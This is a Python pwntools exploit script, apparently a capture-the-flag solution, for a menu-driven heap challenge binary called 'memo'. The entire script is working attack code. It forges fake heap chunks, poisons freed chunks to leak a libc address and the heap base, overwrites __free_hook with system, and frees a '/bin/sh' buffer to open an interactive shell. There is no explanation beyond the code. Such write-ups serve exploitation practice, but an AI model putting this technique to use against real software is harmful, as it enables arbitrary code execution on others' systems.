from pwn import *
import sys, time

context.binary = "./memo"
binary = ELF("./memo")

p = process(["./memo"])
pause()

p.recvuntil("name: ")
p.send(p64(0) + p64(0x31) + p64(0x602a30) + "A" * (0xf - 8) + "\x00")
#p.sendline("A" * 0x1f)

p.recvuntil("n) ")
p.sendline("y")
p.recvuntil("Password: ")
p.send("A" * 0x18 + p64(0x31))
#p.sendline("A" * 0x1f)

def leave_msg(index, length, msg):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Length: ")
    p.sendline(str(length))
    if length > 0x20:
        p.recvuntil("though")
        p.sendline(msg)
    else:
        p.recvuntil("Message: ")
        p.sendline(msg)

def edit_last(msg):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("message: ")
    p.sendline(msg)

def view(index):
    p.recvuntil(">> ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def delete(index):
    p.recvuntil(">> ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def change_password(pwd, name, password):
    p.recvuntil(">> ")
    p.sendline("5")
    p.recvuntil("Password: ")
    p.send(pwd)
    p.recvuntil("name: ")
    p.send(name)
    p.recvuntil("password: ")
    p.send(password)

leave_msg(0, 0x20, "a" * 8)
leave_msg(1, 0x20, "b" * 8)
leave_msg(2, 0x20, "c" * 8)

delete(2)
delete(1)
delete(0)

fake_chunk = p64(0x602a20)

leave_msg(0, 0x50, "/bin/sh\x00" + "A" * 0x20 + p64(0x31) + fake_chunk)
leave_msg(1, 0x20, "d" * 8)
leave_msg(2, 0x50, p64(0x602a30) + p64(0x31) * 7 + p64(0x601f80) + p64(0x602a80))

view(0)
p.recvuntil("Message: ")
puts = u64(p.recv(6).ljust(8, "\x00"))
libc_base = puts - 0x6f690
system = libc_base + 0x45390
free_hook = libc_base + 0x3c67a8

log.info("puts : " + hex(puts))
log.info("libc_base : " + hex(libc_base))
log.info("system : " + hex(system))

leave_msg(2, 0x10, "C" * 8)

view(1)
p.recvuntil("Message: ")
heap = u64(p.recv(4).ljust(8, "\x00")) - 0xa0

log.info("heap : " + hex(heap))

delete(2)

leave_msg(2, 0x60, p64(0x31) * 6 + p64(heap + 0x10) + p64(free_hook) * 3)

edit_last(p64(system))
delete(0)

p.interactive()
